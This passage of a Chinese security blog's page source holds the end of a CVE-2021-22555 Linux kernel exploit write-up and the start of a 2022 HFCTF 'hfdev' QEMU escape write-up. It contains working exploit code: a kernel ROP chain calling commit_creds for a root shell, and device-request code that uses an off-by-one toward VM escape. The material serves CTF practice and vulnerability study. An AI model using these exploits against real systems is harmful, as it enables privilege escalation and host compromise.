                pipe_buffer_ops <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token comment">// break; // free all</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    kernel_offset <span class="token operator">=</span> pipe_buffer_ops <span class="token operator">-</span> <span class="token number">0xffffffff8223e140</span><span class="token punctuation">;</span> <span class="token comment">// anon_pipe_buf_ops</span>
    kernel_base <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] pipe_buffer_ops = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> pipe_buffer_ops<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] kernel_base = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> kernel_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] kernel_offset = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> kernel_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying fake pipe_buffer..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span>secondary_buf<span class="token punctuation">;</span>
    buf<span class="token operator">-></span>ops <span class="token operator">=</span> msg_fake_addr <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">;</span>
    ops <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    ops<span class="token operator">-></span>release <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8172e1ac</span><span class="token punctuation">;</span> <span class="token comment">// push rsi ; jmp qword ptr [rsi + 0x39]</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8106f8c9</span><span class="token punctuation">;</span>    <span class="token comment">// add rsp, 0xd0 ; ret</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0x39</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff81163ea0</span><span class="token punctuation">;</span> <span class="token comment">// pop rsp ; ret</span>
    rop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    ridx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>ridx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8108c650</span><span class="token punctuation">;</span> <span class="token comment">// pop rdi ; ret</span>
    rop<span class="token punctuation">[</span>ridx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8286b780</span><span class="token punctuation">;</span> <span class="token comment">// init_cred</span>
    rop<span class="token punctuation">[</span>ridx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff810c9f00</span><span class="token punctuation">;</span> <span class="token comment">// commit_creds</span>
    rop<span class="token punctuation">[</span>ridx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8108c5bc</span><span class="token punctuation">;</span> <span class="token comment">// mov rsp, rbp ; pop rbp ; ret</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spray_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Releasing pipe_buffer objects..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_PIPEFDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] close"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] close"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

ret<span class="token operator">:</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgctl</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> IPC_RMID<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] msgctl rmid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>漏洞的修复很粗暴，就直接把 memset 这部分给去掉了，具体看 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b29c457a6511435960115c0f548c4360d5f4801d">patch</a></p>
<p>还有个缓解措施是，禁用用户命名空间的功能来阻止普通用户拿到 <code>CAP_NET_ADMIN</code> 权限，参考：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> /proc/sys/user/max_user_namespaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从溢出写 0 到 UAF 这里非常的巧妙，随后的 skb 和 pipe_buffer 结合利用 UAF 的思路应该是十分具备参考性的，非常值得学习</p>
<p>文中未明确提到的参考：</p>
<ul>
<li><a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</a></li>
<li><a href="https://bsauce.github.io/2021/09/23/CVE-2021-22555/">https://bsauce.github.io/2021/09/23/CVE-2021-22555/</a></li>
<li><a href="https://blog.51cto.com/weiguozhihui/1586777">https://blog.51cto.com/weiguozhihui/1586777</a></li>
</ul>
]]></content>
      <categories>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-虎符CTF-hfdev</title>
    <url>/cdcd3a27/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><img src="/images/cdcd3a27/pasted-1.png" alt="pwn!"><br>off-by-one 藏得挺深啊</p>
<span id="more"></span>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>start_qemu.sh 文件如下</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;sh
#gdb -args \
.&#x2F;qemu-system-x86_64 \
-m 256M \
-kernel bzImage \
-hda rootfs.img \
-append &quot;console&#x3D;ttyS0 quiet root&#x3D;&#x2F;dev&#x2F;sda rw init&#x3D;&#x2F;init oops&#x3D;panic panic&#x3D;1 panic_on_warn&#x3D;1 kaslr&quot; \
-monitor &#x2F;dev&#x2F;null \
-smp cores&#x3D;1,threads&#x3D;1 \
-cpu kvm64,+smep,+smap \
-L pc-bios \
-device hfdev \
-no-reboot \
-snapshot  \
-nographic
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到添加了一个叫 <code>hfdev</code> 的设备，将 qemu-system-x86_64 拖入 IDA，函数窗口搜索字符串 <code>hfdev</code> 找到对应函数进行分析</p>
<p><img src="/images/cdcd3a27/pasted-2.png" alt="functions"></p>
<h3 id="HfdevState"><a href="#HfdevState" class="headerlink" title="HfdevState"></a>HfdevState</h3><p>通过逆向分析可以知道，State 大概是这样一个结构体</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">HfdevState</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> pub<span class="token punctuation">[</span><span class="token number">2400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">MemoryRegion</span> pmio<span class="token punctuation">;</span> <span class="token comment">// size = 0x100</span>
  <span class="token class-name">uint64_t</span> phy_src<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> r_size<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> pos<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> cur_size<span class="token punctuation">;</span>
  <span class="token class-name">int64_t</span> time<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">Req</span> req<span class="token punctuation">;</span>  <span class="token comment">// size = 0x400</span>
  <span class="token keyword">char</span> write_buf<span class="token punctuation">[</span><span class="token number">768</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> can_run_hfdev_func<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> req_addr<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">QEMUTimer</span> <span class="token operator">*</span>timer<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">QEMUBH</span> <span class="token operator">*</span>qemubh<span class="token punctuation">;</span>
  <span class="token keyword">char</span> padding<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="hfdev-class-init"><a href="#hfdev-class-init" class="headerlink" title="hfdev_class_init"></a>hfdev_class_init</h3><p>可以看到 vendor_id 和 device_id<br><img src="/images/cdcd3a27/pasted-3.png" alt="hfdev_class_init"></p>
<p>利用 lspci，找到对应的设备 resource 信息，可以找到 PMIO 的端口基址<br><img src="/images/cdcd3a27/pasted-16.png" alt="lspci"></p>
<h3 id="pci-hfdev-realize"><a href="#pci-hfdev-realize" class="headerlink" title="pci_hfdev_realize"></a>pci_hfdev_realize</h3><p>只提供 PMIO<br><img src="/images/cdcd3a27/pasted-4.png" alt="pci_hfdev_realize"></p>
<p>同时还可以看到，创建了一个 timer 和 一个 QEMUBH</p>
<p>这两个东西了解不多，翻源码看了看，大致就是都可以用来做异步回调的事情</p>
<p>可以看到 timer 的回调函数是 hfdev_func，QEMUBH 的回调函数是 hfdev_process</p>
<h3 id="hfdev-func"><a href="#hfdev-func" class="headerlink" title="hfdev_func"></a>hfdev_func</h3><p>可以看到，timer 的操作是把 req_addr 指向的数据拷贝到 write_buf 中，同时这个偏移 pos 是可以无限增长的，如果可以多次触发 timer，就能让这个越界越到后面的数据，包括 timer 和 bh 的指针<br><img src="/images/cdcd3a27/pasted-6.png" alt="hfdev_func"></p>
<h3 id="hfdev-process"><a href="#hfdev-process" class="headerlink" title="hfdev_process"></a>hfdev_process</h3><p>开头先从指定的物理地址读取一个结构体<br><img src="/images/cdcd3a27/pasted-8.png" alt="Req"></p>
<p>大概长这样：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">Req</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">uint8_t</span> cmd<span class="token punctuation">;</span>
  <span class="token keyword">union</span> Body body<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">union</span> Body
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">Reader</span> reader<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">Encoder</span> encoder<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">Timer</span> timer<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>


<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">Reader</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">uint64_t</span> phy_addr<span class="token punctuation">;</span>
  <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1013</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">uint8_t</span> addKey<span class="token punctuation">;</span>
  <span class="token class-name">uint8_t</span> xorKey<span class="token punctuation">;</span>
  <span class="token class-name">uint16_t</span> subcmd<span class="token punctuation">;</span>
  <span class="token class-name">uint16_t</span> enc_num<span class="token punctuation">;</span>
  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1017</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">Timer</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
  <span class="token class-name">uint16_t</span> off<span class="token punctuation">;</span>
  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1019</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大致对应三种操作</p>
<h4 id="Reader"><a href="#Reader" class="headerlink" title="Reader"></a>Reader</h4><p>拷贝 write_buf 中的数据到指定的物理地址<br><img src="/images/cdcd3a27/pasted-9.png" alt="op reader"></p>
<h4 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h4><p>可以看到这里使用了 timer_mod，翻看源码可以了解到这是设置定时器，触发即可回调 hfdev_func，同时这里有个变量决定了是否可以调用 timer_mod，而且 hfdev_func 里面也修改这个变量使其只能调用一次<br><img src="/images/cdcd3a27/pasted-15.png" alt="op timer"></p>
<h4 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h4><p>这里有两种操作，首先 0x2202 对应的是把 data 进行一定的编码后存进 write_buf 里<br><img src="/images/cdcd3a27/pasted-11.png" alt="op encoder 1"></p>
<p>0x2022 则是对 write_buf 和 data 异或编码<br><img src="/images/cdcd3a27/pasted-12.png" alt="op encoder 2"></p>
<p>同时可以看到这里比较用的是 <code>&gt;=</code>，存在off-by-one（可恶，比赛的时候就没看出来）</p>
<h3 id="hfdev-port-write"><a href="#hfdev-port-write" class="headerlink" title="hfdev_port_write"></a>hfdev_port_write</h3><p>写端口这里就是设置各种参数，还有就是触发 bh 的事件回调的操作<br><img src="/images/cdcd3a27/pasted-13.png" alt="hfdev_port_write"></p>
<h3 id="hfdev-port-read"><a href="#hfdev-port-read" class="headerlink" title="hfdev_port_read"></a>hfdev_port_read</h3><p>读取各种参数，没啥好说的<br><img src="/images/cdcd3a27/pasted-14.png" alt="hfdev_port_read"></p>
<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>现有的信息：</p>
<ol>
<li>timer 的 pos 不断增长的过程中可以越界</li>
<li>pos 越界后，利用 reader 可以读到 write_buf 后面的信息，比如 timer 对象指针和 bh 对象指针</li>
<li>pos 的越界，也让 encoder 可以修改 timer 指针和 bh 指针，可以伪造这两个对象劫持程序执行流</li>
<li>encoder 的 0x2022 功能存在 off-by-one</li>
</ol>
<h3 id="off-by-one-修改-checker"><a href="#off-by-one-修改-checker" class="headerlink" title="off-by-one 修改 checker"></a>off-by-one 修改 checker</h3><p>首先得控制 checker （即 can_run_hfdev_func）变量，以进行多次触发 timer，具体步骤如下：</p>
<ol>
<li>使用 encoder 0x2202 功能，让 pos = 0x200</li>
<li>触发 timer，pos += 0x100</li>
<li>encoder 0x2022 功能，off-by-one，修改 <code>write_buf[0x300]</code>，这刚好是 checker 变量的位置</li>
</ol>
<p>代码如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">set_phy_addr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">set_request_size</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// leak heap</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. leaking heap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// getchar();</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos = 0x200"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC1<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x200</span><span class="token punctuation">;</span>
<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos += 0x100"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] off-by-one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x300</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
